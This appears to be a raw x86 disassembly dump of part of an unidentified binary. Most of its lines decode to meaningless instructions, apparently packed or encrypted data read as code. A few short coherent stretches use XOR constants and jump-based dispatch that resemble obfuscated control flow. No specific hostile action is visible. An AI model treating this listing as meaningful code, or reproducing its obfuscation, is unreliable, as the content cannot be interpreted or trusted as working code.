  4075c3:	fs xchg ebp,eax
  4075c5:	mov    ds,WORD PTR [eax-0xe70e250]
  4075cb:	(bad)  
  4075cc:	jg     0x4075ac
  4075ce:	mov    ch,0xec
  4075d0:	jns    0x407624
  4075d2:	imul   BYTE PTR [edi-0x6b]
  4075d5:	jle    0x40759a
  4075d7:	icebp  
  4075d8:	mov    dh,0xcf
  4075da:	mov    bh,0xd3
  4075dc:	popf   
  4075dd:	cdq    
  4075de:	mov    ecx,0xe4f2e2aa
  4075e3:	jae    0x40757e
  4075e5:	leave  
  4075e6:	adc    BYTE PTR [ebx],bh
  4075e8:	xor    al,0x37
  4075ea:	inc    ebp
  4075eb:	(bad)  
  4075ec:	js     0x407657
  4075ee:	sub    edi,eax
  4075f0:	jbe    0x40761a
  4075f2:	adc    BYTE PTR [ecx-0x2d],ah
  4075f5:	cld    
  4075f6:	sbb    bl,BYTE PTR [ebx+0x753821d6]
  4075fc:	xchg   edx,eax
  4075fd:	test   BYTE PTR [ebp+0x3c],cl
  407600:	inc    edi
  407601:	fcmovbe st,st(4)
  407603:	xchg   edi,eax
  407604:	in     eax,dx
  407605:	and    bh,BYTE PTR [esi]
  407607:	add    al,0xe6
  407609:	mov    ss,WORD PTR [edx-0x3b66421d]
  40760f:	aad    0xe
  407611:	jmp    0x407602
  407613:	and    ah,bl
  407615:	leave  
  407616:	mov    ecx,0x244cd28f
  40761b:	repz add eax,0x24e2b725
  407621:	sbb    bh,bl
  407623:	xor    bh,BYTE PTR [ebp*4+0x74c15ff8]
  40762a:	into   
  40762b:	(bad)  
  40762c:	push   edi
  40762d:	(bad)  
  40762e:	mov    bh,0xde
  407630:	sub    al,0x9e
  407632:	outs   dx,DWORD PTR ds:[esi]
  407633:	jecxz  0x407615
  407635:	mov    ecx,?
  407637:	fild   WORD PTR [ebx-0x3d]
  40763a:	and    al,0x4a
  40763c:	jmp    0x40768c
  40763e:	pop    es
  40763f:	pushf  
  407640:	inc    esi
  407641:	and    cl,BYTE PTR [eax-0x35]
  407644:	jb     0x40767d
  407646:	cmp    ecx,DWORD PTR [edi-0x76077bf6]
  40764c:	jle    0x407652
  40764e:	jmp    0x4083e6
  407653:	mov    eax,DWORD PTR [ebp-0x24]
  407656:	add    eax,DWORD PTR [ebp-0x4]
  407659:	mov    DWORD PTR [ebp-0x28],eax
  40765c:	mov    eax,DWORD PTR [ebp-0x28]
  40765f:	mov    eax,DWORD PTR [ebp-0x4]
  407662:	mov    eax,DWORD PTR [ebp-0x28]
  407665:	mov    eax,DWORD PTR [eax+0xc]
  407668:	mov    edx,DWORD PTR [ebp-0x4]
  40766b:	movzx  eax,WORD PTR [edx+eax*1]
  40766f:	cdq    
  407670:	shld   edx,eax,0x2
  407674:	xor    edx,ecx
  407676:	mov    DWORD PTR [ebp+0xc],edx
  407679:	jmp    0x407a1a
  40767e:	sbb    BYTE PTR [edi-0x2f],cl
  407681:	pop    esi
  407682:	call   0x3e77:0x3eb7bc64
  407689:	fisttp QWORD PTR [edx]
  40768b:	stc    
  40768c:	ss xchg edx,eax
  40768e:	mov    esi,0xbdbebe57
  407693:	les    edi,FWORD PTR [esi-0x5577d842]
  407699:	fcomp  QWORD PTR [eax]
  40769b:	int3   
  40769c:	push   ss
  40769d:	loopne 0x407671
  40769f:	arpl   si,dx
  4076a1:	mov    dl,0xfb
  4076a3:	outs   dx,DWORD PTR ds:[esi]
  4076a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076a5:	xor    DWORD PTR [bx+si],0x5c
  4076a9:	sti    
  4076aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076ab:	jae    0x40762e
  4076ad:	call   0xf9eb:0xd548b3b9
  4076b4:	jo     0x40772f
  4076b6:	loop   0x4076a4
  4076b8:	sub    al,cl
  4076ba:	xor    al,0xe0
  4076bc:	or     BYTE PTR ds:0x153f5f72,ah
  4076c2:	fist   WORD PTR [ecx+eax*1]
  4076c5:	jmp    0x407667
  4076c7:	adc    edi,edi
  4076c9:	or     ebp,DWORD PTR [ebx+0x437a1a1a]
  4076cf:	call   0x3f8b:0x3ef59e00
  4076d6:	inc    edx
  4076d7:	je     0x40766d
  4076d9:	and    cl,al
  4076db:	inc    ecx
  4076dc:	dec    ebx
  4076dd:	leave  
  4076de:	je     0x407718
  4076e0:	int    0x6c
  4076e2:	mov    ds:0xfb0335f5,eax
  4076e7:	jno    0x407678
  4076e9:	adc    esi,DWORD PTR [ebx-0x74f690d0]
  4076ef:	jo     0x407714
  4076f1:	dec    edx
  4076f2:	das    
  4076f3:	xor    al,BYTE PTR [edi-0x5c]
  4076f6:	xchg   ebx,eax
  4076f7:	popa   
  4076f8:	or     al,0xde
  4076fa:	cmp    dh,BYTE PTR [esi+0x589dd170]
  407700:	fwait
  407701:	xchg   ah,ch
  407703:	test   al,0xa5
  407705:	cmp    DWORD PTR [edi+0x35],eax
  407708:	aam    0x3d
  40770a:	dec    eax
  40770b:	push   esp
  40770c:	inc    edi
  40770d:	out    dx,eax
  40770e:	xchg   ebp,eax
  40770f:	sbb    edi,esi
  407711:	pop    ebp
  407712:	aam    0x30
  407714:	cmp    eax,0xb1fc25b
  407719:	mov    ebp,0x9d0f53bb
  40771e:	jecxz  0x40779c
  407720:	mov    edi,0xea422e43
  407725:	fimul  DWORD PTR [edx+0x59]
  407728:	mov    ch,0x3f
  40772a:	bound  ecx,QWORD PTR [ebx]
  40772c:	dec    esp
  40772d:	gs ret 
  40772f:	and    DWORD PTR [esi],ecx
  407731:	aas    
  407732:	sbb    bl,bl
  407734:	mov    bh,0xd6
  407736:	lahf   
  407737:	push   ss
  407738:	cli    
  407739:	fistp  QWORD PTR [ecx-0x1a]
  40773c:	push   esi
  40773d:	inc    ecx
  40773e:	call   0x7fe:0x768ff4b7
  407745:	mov    eax,edi
  407747:	outs   dx,DWORD PTR ds:[esi]
  407748:	mov    edx,0x84520943
  40774d:	or     bl,BYTE PTR [edx]
  40774f:	jmp    0x407787
  407751:	vpunpckhwd ymm1,ymm3,YMMWORD PTR [edx-0x4e]
  407757:	stos   BYTE PTR es:[edi],al
  407758:	inc    esp
  407759:	mov    edx,0x664504e2
  40775e:	ficom  WORD PTR [eax]
  407760:	jg     0x4076f5
  407762:	jmp    0xc0fb:0xc4cfded1
  407769:	cli    
  40776a:	int3   
  40776b:	pop    es
  40776c:	lahf   
  40776d:	jbe    0x4077a3
  40776f:	adc    al,0xdf
  407771:	sahf   
  407772:	mov    al,0xdf
  407774:	sbb    ebx,DWORD PTR [eax-0x45ba5cd5]
  40777a:	mov    eax,0xf979edc6
  40777f:	xchg   ebp,eax
  407780:	stos   BYTE PTR es:[edi],al
  407781:	daa    
  407782:	mov    BYTE PTR [esi+0x5f6b822e],ch
  407788:	aas    
  407789:	retf   0x704c
  40778c:	push   eax
  40778d:	imul   edx,edi,0xffffff8a
  407790:	and    bl,al
  407792:	pop    eax
  407793:	inc    esi
  407794:	test   BYTE PTR [edx+esi*8],ah
  407797:	jmp    0x407759
  407799:	push   ebp
  40779a:	pop    ebp
  40779b:	fistp  QWORD PTR [edi-0x7bf312b7]
  4077a1:	xchg   BYTE PTR [eax+edi*4],dl
  4077a4:	jmp    FWORD PTR [esi+0x27]
  4077a7:	sub    ch,BYTE PTR [edx-0x3e]
  4077aa:	and    bh,dl
  4077ac:	ret    
  4077ad:	or     al,0x86
  4077af:	scas   al,BYTE PTR es:[edi]
  4077b0:	and    bh,BYTE PTR [esi-0x6c8e3a4a]
  4077b6:	test   ah,bl
  4077b8:	pop    eax
  4077b9:	xor    DWORD PTR [ecx+0x51aaaff2],esi
  4077bf:	out    dx,eax
  4077c0:	aad    0x46
  4077c2:	dec    esp
  4077c3:	repnz stc 
  4077c5:	mov    al,ds:0x29a8d9a8
  4077ca:	mov    WORD PTR [ecx-0x1ded3250],?
  4077d0:	dec    ecx
  4077d1:	(bad)  
  4077d2:	mov    ecx,0x2bf22246
  4077d7:	sub    bl,BYTE PTR [ebp+0x13]
  4077da:	lods   al,BYTE PTR ds:[esi]
  4077db:	xchg   ecx,eax
  4077dc:	xchg   ecx,eax
  4077dd:	test   eax,0xf9ef2167
  4077e2:	pop    esp
  4077e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077e4:	push   es
  4077e5:	jnp    0x4077b1
  4077e7:	sub    cl,BYTE PTR [esi+0x5b]
  4077ea:	cmp    ebp,DWORD PTR [eax]
  4077ec:	jge    0x40777a
  4077ee:	sbb    ch,ah
  4077f0:	es pop edi
  4077f2:	mov    ds:0xb50f741e,al
  4077f7:	dec    eax
  4077f8:	ins    BYTE PTR es:[edi],dx
  4077f9:	push   es
  4077fa:	xchg   ebp,eax
  4077fb:	fwait
  4077fc:	cs pop edi
  4077fe:	lods   eax,DWORD PTR ds:[esi]
  4077ff:	xchg   edx,eax
  407800:	fild   QWORD PTR [eax]
  407802:	call   0x44d0f378
  407807:	(bad)  
  407808:	xchg   edx,eax
  407809:	outs   dx,BYTE PTR ds:[esi]
  40780a:	inc    edi
  40780b:	cmp    al,0x53
  40780d:	add    bh,al
  40780f:	dec    eax
  407810:	mov    cl,0x98
  407812:	imul   esi,ecx,0xacd52674
  407818:	push   ds
  407819:	stos   DWORD PTR es:[edi],eax
  40781a:	or     ecx,ebp
  40781c:	ja     0x407851
  40781e:	sub    al,0xe1
  407820:	pop    ebx
  407821:	adc    al,0x7a
  407823:	add    BYTE PTR [ebx+eiz*4],bh
  407826:	in     eax,dx
  407827:	(bad)  
  407828:	out    0x11,al
  40782a:	stos   DWORD PTR es:[edi],eax
  40782b:	aad    0xc2
  40782d:	jmp    0x4077da
  40782f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407830:	sar    DWORD PTR [ecx+0x44d4b97c],1
  407836:	ss pop ebp
  407838:	cmp    bh,cl
  40783a:	outs   dx,BYTE PTR ds:[esi]
  40783b:	mov    dh,0x7a
  40783d:	call   0xc4ad6ace
  407842:	mov    eax,ds:0x89cbf9d6
  407847:	pop    edx
  407848:	mov    eax,ds:0xe1399ef0
  40784d:	out    dx,al
  40784e:	rol    DWORD PTR [ebx],0x48
  407851:	push   esp
  407852:	jae    0x40785c
  407854:	mov    ds:0x267c80a5,eax
  407859:	ja     0x4078b3
  40785b:	shl    bh,1
  40785d:	into   
  40785e:	test   al,0x7c
  407860:	dec    esp
  407861:	xor    al,0xea
  407863:	retf   0x6c41
  407866:	and    bl,bl
  407868:	fistp  QWORD PTR [esi]
  40786a:	cmp    DWORD PTR ds:0x9028d2f9,0xe8fb03c0
  407874:	js     0x407830
  407876:	mov    eax,0x7885f169
  40787b:	cmc    
  40787c:	cmp    cl,BYTE PTR [esi+0x1464fbc9]
  407882:	push   edx
  407883:	cmp    al,0xf7
  407885:	aas    
  407886:	ja     0x4078e0
  407888:	test   eax,ecx
  40788a:	jmp    0x5597:0xdcc9e8ee
  407891:	mov    ah,0xc
  407893:	arpl   bx,ax
  407895:	int    0xf2
  407897:	ja     0x40787b
  407899:	outs   dx,BYTE PTR ds:[esi]
  40789a:	or     eax,0x699a41b1
  40789f:	faddp  st(7),st
  4078a1:	repnz pop ss
  4078a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078a4:	out    0x2f,eax
  4078a6:	inc    esi
  4078a7:	sub    esi,DWORD PTR [ebx+0x2bf8510d]
  4078ad:	clc    
  4078ae:	cld    
  4078af:	popa   
  4078b0:	call   0x4cb5c4a9
  4078b5:	mov    WORD PTR [eax+0x4e],cs
  4078b8:	sub    DWORD PTR [edx],edx
  4078ba:	clc    
  4078bb:	adc    ecx,DWORD PTR [ebp-0x2a]
  4078be:	cmc    
  4078bf:	clc    
  4078c0:	jae    0x4078e3
  4078c2:	inc    edi
  4078c3:	sbb    DWORD PTR [eax+eiz*4],ebx
  4078c6:	(bad)  
  4078c7:	or     ax,0x6496
  4078cb:	add    al,BYTE PTR [ebp+ebx*4-0x45270a92]
  4078d2:	adc    BYTE PTR [esi-0x7dc70b4a],ah
  4078d8:	scas   eax,DWORD PTR es:[edi]
  4078d9:	hlt    
  4078da:	lock clc 
  4078dc:	imul   edx,DWORD PTR [eax-0x6c],0x7f
  4078e0:	adc    al,0x8f
  4078e2:	int    0x43
  4078e4:	pop    esp
  4078e5:	outs   dx,BYTE PTR ds:[esi]
  4078e6:	retf   
  4078e7:	(bad)  [ecx]
  4078e9:	fadd   QWORD PTR [ecx+0x21]
  4078ec:	push   ebp
  4078ed:	and    al,0x26
  4078ef:	add    eax,ebx
  4078f1:	jo     0x4078f4
  4078f3:	inc    ebp
  4078f4:	ret    
  4078f5:	push   esi
  4078f6:	pusha  
  4078f7:	jmp    0x6b76:0x9927eb75
  4078fe:	mov    al,0x1e
  407900:	dec    ebx
  407901:	mov    cl,0x61
  407903:	(bad)  
  407904:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407905:	mov    WORD PTR [edi],fs
  407907:	adc    al,BYTE PTR [ecx]
  407909:	or     ecx,DWORD PTR [eax+0x120d5fcb]
  40790f:	sahf   
  407910:	or     al,0x6a
  407912:	mov    eax,0xf947c087
  407917:	ret    
  407918:	bound  esp,QWORD PTR [eiz*4-0x17a2e0df]
  40791f:	dec    ebx
  407920:	arpl   WORD PTR [ebp+0x7ea05f44],di
  407926:	pushf  
  407927:	mov    cl,al
  407929:	out    0xc6,al
  40792b:	dec    ebp
  40792c:	push   edi
  40792d:	mov    ebp,ebp
  40792f:	pop    fs
  407931:	fcmovnu st,st(2)
  407933:	mov    esi,ebp
  407935:	in     al,0x7
  407937:	and    al,0xd5
  407939:	lods   al,BYTE PTR ds:[esi]
  40793a:	pop    edx
  40793b:	aad    0x2e
  40793d:	ins    DWORD PTR es:[edi],dx
  40793e:	mov    esp,0x18f7d179
  407943:	jmp    0x40798c
  407945:	mov    dh,BYTE PTR [ebp+esi*2-0x2a7b10e5]
  40794c:	push   ss
  40794d:	out    0x4b,eax
  40794f:	in     al,0xc4
  407951:	fs test eax,0xc81ac80d
  407957:	push   ecx
  407958:	mov    ebx,0xfc6cff24
  40795d:	mov    ?,ebx
  40795f:	pop    ecx
  407960:	add    al,0x31
  407962:	mov    edi,0x277005b4
  407967:	aas    
  407968:	mov    esp,0x8d2184d3
  40796d:	jae    0x407968
  40796f:	dec    esi
  407970:	test   BYTE PTR [ebp+0x79],dl
  407973:	rol    bh,cl
  407975:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407976:	xor    DWORD PTR [esi-0xabce8a],edx
  40797c:	cld    
  40797d:	inc    ebp
  40797e:	push   edi
  40797f:	fidivr WORD PTR [eax]
  407981:	mov    eax,ecx
  407983:	cwde   
  407984:	mov    DWORD PTR [esp+edx*2+0x40],esp
  407988:	pop    ds
  407989:	jmp    0x407956
  40798b:	retf   
  40798c:	test   eax,0x1dd77369
  407991:	(bad)  
  407992:	aaa    
  407993:	idiv   BYTE PTR [eax]
  407995:	sub    eax,0x95bf2195
  40799a:	xchg   ebx,eax
  40799b:	out    0xb6,eax
  40799d:	mov    edx,0x842d27a2
  4079a2:	add    cl,BYTE PTR [ecx-0x5c]
  4079a5:	push   ecx
  4079a6:	pop    ecx
  4079a7:	mov    ds:0x91163cb4,al
  4079ac:	pusha  
  4079ad:	or     cl,bl
  4079af:	cmp    eax,0xc661872
  4079b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079b5:	pop    ss
  4079b6:	(bad)  
  4079b7:	mov    ebp,?
  4079b9:	pop    edx
  4079ba:	rol    BYTE PTR [ecx+0x3244954d],0x21
  4079c1:	push   es
  4079c2:	push   esp
  4079c3:	xor    esi,0x3e
  4079c6:	daa    
  4079c7:	rol    DWORD PTR [esi-0x58],1
  4079ca:	inc    ebp
  4079cb:	mul    BYTE PTR [edx+0x762694f5]
  4079d1:	xchg   edi,eax
  4079d2:	scas   eax,DWORD PTR es:[edi]
  4079d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079d4:	or     BYTE PTR ds:0x676e84eb,dh
  4079da:	(bad)  
  4079db:	loopne 0x4079b6
  4079dd:	pop    esi
  4079de:	pop    edi
  4079df:	sti    
  4079e0:	xor    eax,0x167ebcc
  4079e5:	mov    bh,0xba
  4079e7:	dec    ebx
  4079e8:	xor    ebp,ebp
  4079ea:	add    al,ah
  4079ec:	shl    DWORD PTR [ecx-0x29],0x50
  4079f0:	rol    DWORD PTR [edx+ebp*2],1
  4079f3:	lods   eax,DWORD PTR ds:[esi]
  4079f4:	xchg   BYTE PTR [ebp+0x5d11bc1e],ah
  4079fa:	call   0xcc41:0x607a9888
  407a01:	inc    esp
  407a02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a03:	dec    esp
  407a04:	fmul   st,st(0)
  407a06:	inc    edx
  407a07:	icebp  
  407a08:	jbe    0x4079b8
  407a0a:	ss push edi
  407a0c:	or     cl,BYTE PTR [edx-0x58b24ae7]
  407a12:	push   edi
  407a13:	ja     0x4079d4
  407a15:	out    dx,al
  407a16:	or     edx,DWORD PTR ds:0x558be35d
  407a1c:	test   al,0xc1
  407a1e:	loopne 0x407a22
  407a20:	mov    DWORD PTR [ebp+0x10],edx
  407a23:	mov    edx,DWORD PTR [ebp-0x54]
  407a26:	xor    eax,0xcb79b576
  407a2b:	mov    DWORD PTR [ebp+0x14],edx
  407a2e:	cmp    eax,DWORD PTR [ebp+0x10]
  407a31:	jne    0x408352
  407a37:	mov    eax,edx
  407a39:	cmp    DWORD PTR [ebp+0xc],eax
  407a3c:	jne    0x408352
  407a42:	mov    DWORD PTR [ebp+0x8],0xcb79b576
  407a49:	mov    DWORD PTR [ebp+0xc],ecx
  407a4c:	mov    DWORD PTR [ebp-0x60],0xcb79b572
  407a53:	mov    DWORD PTR [ebp-0x5c],ecx
  407a56:	mov    DWORD PTR [ebp-0x48],0xcb79b57e
  407a5d:	mov    DWORD PTR [ebp-0x44],ecx
  407a60:	mov    DWORD PTR [ebp-0x38],0xcb79b57a
  407a67:	mov    DWORD PTR [ebp-0x34],ecx
  407a6a:	mov    eax,DWORD PTR [ebp+0x8]
  407a6d:	jmp    0x407e0e
  407a72:	cmp    eax,0x2444c2a4
  407a77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a78:	inc    eax
  407a79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a7a:	ret    0x7a7b
  407a7d:	xchg   edx,eax
  407a7e:	pop    ds
  407a7f:	int3   
  407a80:	jecxz  0x407a12
  407a82:	mov    ebp,0xbdbebe5d
  407a87:	les    edi,FWORD PTR [esi+0x51c38fbe]
  407a8d:	les    edx,FWORD PTR [edx+0x4d6528c1]
  407a93:	push   0xffffffb0
  407a95:	cmp    eax,0xa782183e
  407a9a:	xor    al,0xfb
  407a9c:	inc    edx
  407a9d:	aad    0x5d
  407a9f:	mov    eax,ds:0xa244ab96
  407aa4:	data16 test BYTE PTR [edi-0x4ceda911],ah
  407aab:	fnsave [ecx+esi*8]
  407aae:	push   esi
  407aaf:	dec    ebx
  407ab0:	jb     0x407b20
  407ab2:	retf   0xae01
  407ab5:	loop   0x407a8d
  407ab7:	lods   al,BYTE PTR ds:[esi]
  407ab8:	mov    WORD PTR [ebp+0x784b57e7],?
  407abe:	push   ecx
  407abf:	je     0x407a9e
  407ac1:	out    0xd5,al
  407ac3:	jl     0x407aa7
  407ac5:	clc    
  407ac6:	push   ds
  407ac7:	dec    edx
  407ac8:	ss sbb cl,BYTE PTR fs:[esi+edx*4]
  407acd:	ds and edi,ebp
  407ad0:	mov    esp,0xa5b41bfd
  407ad5:	xor    eax,0x7383e571
  407ada:	mov    edx,DWORD PTR fs:[edi+0x7d]
  407ade:	push   ecx
  407adf:	leave  
  407ae0:	jecxz  0x407b4d
  407ae2:	fild   WORD PTR [edx]
  407ae4:	ror    BYTE PTR [esi+0x4a],cl
  407ae7:	mov    ch,0xdc
  407ae9:	es stc 
  407aeb:	lea    ebp,[esi+0x19a16456]
  407af1:	cld    
  407af2:	(bad)  
  407af3:	outs   dx,BYTE PTR ds:[esi]
  407af4:	xchg   ebx,eax
  407af5:	jmp    0x5439:0x99b58df2
  407afc:	add    al,0x9c
  407afe:	or     al,0x37
  407b00:	jecxz  0x407b2b
  407b02:	xchg   edx,eax
  407b03:	lds    ecx,FWORD PTR [eax-0x7f]
  407b06:	sbb    al,0x7d
  407b08:	push   edx
  407b09:	push   0x3f
  407b0b:	or     eax,0xd15d8f1
  407b10:	mov    ebp,0xbe7e35e5
  407b15:	xchg   edi,eax
  407b16:	ja     0x407acc
  407b18:	icebp  
  407b19:	xchg   BYTE PTR [ebx+0xbbe19ff],dl
  407b1f:	inc    edi
  407b20:	shl    BYTE PTR [eax+0xb],0xc7
  407b24:	xchg   ebp,eax
  407b25:	cmp    DWORD PTR [edx],edx
  407b27:	retf   0x7252
  407b2a:	xor    eax,0xcfe9fa57
  407b2f:	call   0x2f2f:0xbaf2ad76
  407b36:	push   ss
  407b37:	arpl   WORD PTR [ebx],cx
  407b39:	scas   eax,DWORD PTR es:[edi]
  407b3a:	hlt    
  407b3b:	xor    DWORD PTR [edi+0x165f623],edi
  407b41:	mov    DWORD PTR ss:[ebx+0x7b],ebx
  407b45:	push   eax
  407b46:	or     ebp,DWORD PTR [eax]
  407b48:	cld    
  407b49:	mov    WORD PTR [eax+esi*1],cs
  407b4c:	arpl   WORD PTR [ecx],bp
  407b4e:	shl    BYTE PTR [ebx-0x28b0238e],1
  407b54:	hlt    
  407b55:	arpl   WORD PTR [edx],ax
  407b57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b58:	adc    BYTE PTR [edx],0x63
  407b5b:	out    dx,al
  407b5c:	mov    WORD PTR [ecx-0x1b],es
  407b5f:	adc    cl,bh
  407b61:	add    al,0xb7
  407b63:	iret   
  407b64:	sub    al,0xcf
  407b66:	icebp  
  407b67:	out    dx,al
  407b68:	in     al,0x3f
  407b6a:	bound  ebx,QWORD PTR ds:0x659df668
  407b70:	dec    esp
  407b71:	aad    0x3a
  407b73:	aas    
  407b74:	fcmovnbe st,st(5)
  407b76:	fsub   QWORD PTR [esi]
  407b78:	sbb    ebx,0x934748f9
  407b7e:	lods   al,BYTE PTR ds:[esi]
  407b7f:	icebp  
  407b80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b81:	lds    edx,FWORD PTR [edx+eax*8-0x17]
  407b85:	dec    ebp
  407b86:	xchg   ebp,eax
  407b87:	cmp    al,0xdb
  407b89:	mov    BYTE PTR [edi-0x2b],dl
  407b8c:	jmp    0xac91ca84
  407b91:	dec    ebx
  407b92:	das    
  407b93:	mov    eax,ds:0xdb022922
  407b99:	add    eax,0x5611e1c5
  407b9e:	add    DWORD PTR [esi+ebp*2-0x2650bc88],edi
  407ba5:	sub    DWORD PTR [ebp-0x3a],edi
  407ba8:	cdq    
  407ba9:	or     eax,0x414fcf7b
  407baf:	test   BYTE PTR [esi+0x3c],ah
  407bb2:	mov    ecx,0xb5ff229c
  407bb7:	scas   al,BYTE PTR es:[edi]
  407bb8:	add    eax,DWORD PTR [eax+0x3b]
  407bbb:	out    dx,al
  407bbc:	sahf   
  407bbd:	pusha  
  407bbe:	rcl    BYTE PTR [ebx+0x525b404a],cl
  407bc4:	test   al,0x27
  407bc6:	add    ebx,ebx
  407bc8:	gs inc eax
  407bca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bcb:	add    DWORD PTR [edx+0x21],ebp
  407bce:	imul   ebx,DWORD PTR [ebx+0x66989ab9],0x34
  407bd5:	lahf   
  407bd6:	lea    eax,[edx]
  407bd8:	neg    BYTE PTR [ebx-0x792863fc]
  407bde:	pop    edi
  407bdf:	xor    DWORD PTR [eax],esp
  407be1:	cmp    eax,DWORD PTR [ebp+0x64f08c3c]
  407be7:	enter  0xc1ee,0x14
  407beb:	loop   0x407c62
  407bed:	outs   dx,BYTE PTR ds:[esi]
  407bee:	push   ds
  407bef:	xchg   esi,eax
  407bf0:	xchg   esi,eax
  407bf1:	xchg   esp,eax
  407bf2:	fisubr DWORD PTR [esi+0x16]
  407bf5:	fdiv   DWORD PTR [edx+0x30]
  407bf8:	in     al,0x58
  407bfa:	jns    0x407ba5
  407bfc:	push   0xffffffde
  407bfe:	adc    DWORD PTR [edx],0xffffff9c
  407c01:	mov    ds:0x263ba3aa,eax
  407c06:	xchg   ebp,eax
  407c07:	add    eax,0x522dfd11
  407c0c:	mov    bl,0x8
  407c0e:	sbb    ebp,ebx
  407c10:	repnz push 0xca063083
  407c16:	jns    0x407c24
  407c18:	repz les ebp,FWORD PTR [edx-0x15]
  407c1c:	enter  0x6bdb,0xf8
  407c20:	icebp  
  407c21:	jae    0x407c18
  407c23:	not    BYTE PTR [eax-0x41]
  407c26:	mov    eax,ds:0xa720dacd
  407c2b:	hlt    
  407c2c:	add    ah,BYTE PTR [ecx]
  407c2e:	xor    cl,BYTE PTR [eax+0x5b782d4e]
  407c34:	(bad)  
  407c35:	and    al,0x4a
  407c37:	jnp    0x407bb9
  407c39:	mov    dl,0x1d
  407c3b:	xor    bh,ch
  407c3d:	pop    edx
  407c3e:	or     ebx,DWORD PTR ss:[ebp+0x6e4bdf4e]
  407c45:	call   0x93b9:0x1f83078e
  407c4c:	test   BYTE PTR [esi-0x7b35542b],0x9d
  407c53:	sub    esp,ecx
  407c55:	jp     0x407c1b
  407c57:	ss test ch,bh
  407c5a:	mov    ds:0x94ac70be,eax
  407c5f:	sahf   
  407c60:	jbe    0x407c7a
  407c62:	adc    eax,0x9355639e
  407c67:	into   
  407c68:	dec    esp
  407c69:	pop    ecx
  407c6a:	jmp    0xd831:0x74975773
  407c71:	xchg   edi,eax
  407c72:	bound  ecx,QWORD PTR [edi+ecx*4+0x39]
  407c76:	adc    ebp,DWORD PTR [edi+eiz*1]
  407c79:	jp     0x407ce9
  407c7b:	imul   BYTE PTR [edx]
  407c7d:	loopne 0x407c9f
  407c7f:	cmp    eax,0xa5d1db11
  407c84:	iret   
  407c85:	add    ch,dl
  407c87:	sahf   
  407c88:	push   ebp
  407c8a:	add    ah,cl
  407c8c:	shl    dh,cl
  407c8e:	mov    esp,0xa70c7f28
  407c93:	fimul  WORD PTR [edi]
  407c95:	retf   
  407c96:	cdq    
  407c97:	int3   
  407c98:	and    BYTE PTR [eax+0x33],ah
  407c9b:	pushf  
  407c9c:	jbe    0x407cad
  407c9e:	cmp    eax,DWORD PTR [edi]
  407ca0:	mov    dh,0x96
  407ca2:	fisubr WORD PTR [ebx+0x1c3aadeb]
  407ca8:	scas   al,BYTE PTR es:[edi]
  407ca9:	sbb    ah,0x3a
  407cac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cad:	mov    ds:0x31003166,al
  407cb2:	mul    DWORD PTR [edi-0x35b4fcab]
  407cb8:	lea    edi,ds:0x30c51de3
  407cbe:	pop    ebp
  407cbf:	xor    al,0xee
  407cc1:	test   DWORD PTR [edx-0x64],ebx
  407cc4:	mov    ds:0xe0a0ad5f,al
  407cc9:	cmp    ch,BYTE PTR [ebp+0x4d]
  407ccc:	clc    
  407ccd:	or     eax,0x5a4ca688
  407cd2:	or     edi,ebp
  407cd4:	or     edi,edx
  407cd6:	or     edx,DWORD PTR [ebp+0x4b363403]
  407cdc:	loopne 0x407c73
  407cde:	mov    dh,0x6
  407ce0:	hlt    
  407ce1:	push   esi
  407ce2:	(bad)  
  407ce3:	xor    ch,cl
  407ce5:	loop   0x407d12
  407ce7:	mov    eax,ds:0x922970f0
  407cec:	jl     0x407d35
  407cee:	leave  
  407cef:	pop    ecx
  407cf0:	mov    ecx,0x1937293
  407cf5:	hlt    
  407cf6:	mov    BYTE PTR [ecx+0x18],al
  407cf9:	popf   
  407cfa:	fsub   DWORD PTR [eax+0x17]
  407cfd:	je     0x407ce3
  407cff:	push   ebp
  407d00:	scas   al,BYTE PTR es:[edi]
  407d01:	add    al,BYTE PTR [ebp+ecx*8-0xe9c695d]
  407d08:	xchg   esp,eax
  407d09:	icebp  
  407d0a:	ja     0x407d3b
  407d0c:	sbb    BYTE PTR [ebx-0x20],dh
  407d0f:	es push ebx
  407d11:	cmc    
  407d12:	add    BYTE PTR [ebx+0x40],dl
  407d15:	popa   
  407d16:	dec    edx
  407d17:	dec    ebx
  407d18:	push   0xb6ee65
  407d1d:	enter  0xf440,0xf
  407d21:	add    BYTE PTR [edx],dh
  407d23:	jle    0x407d11
  407d25:	imul   ebx,DWORD PTR [edi],0x2c
  407d28:	popf   
  407d29:	std    
  407d2a:	xor    ch,BYTE PTR [edx+0x16]
  407d2d:	push   ds
  407d2e:	mov    dh,0xf0
  407d30:	pop    esp
  407d31:	icebp  
  407d32:	pop    ebx
  407d33:	jmp    0x9e5525fb
  407d38:	inc    esi
  407d39:	test   al,0xea
  407d3b:	out    0x19,eax
  407d3d:	mov    ch,0x34
  407d3f:	xchg   edx,eax
  407d40:	fild   DWORD PTR ds:0xafc05cd5
  407d46:	js     0x407d3a
  407d48:	lahf   
  407d49:	lea    ebx,[edx-0x393f16ac]
  407d4f:	jo     0x407d26
  407d51:	xchg   edx,eax
  407d52:	jg     0x407dbb
  407d54:	add    BYTE PTR [esp+ebx*8+0x66aadf1d],0x8
  407d5c:	jno    0x407d15
  407d5e:	jb     0x407ce8
  407d60:	pop    eax
  407d61:	ficom  WORD PTR [edx-0x55]
  407d64:	cwde   
  407d65:	jle    0x407d92
  407d67:	xor    BYTE PTR [ebp-0x7a],bl
  407d6a:	sti    
  407d6b:	or     bl,BYTE PTR [edi-0x20]
  407d6e:	cmp    eax,0x574a9cde
  407d73:	retf   
  407d74:	cli    
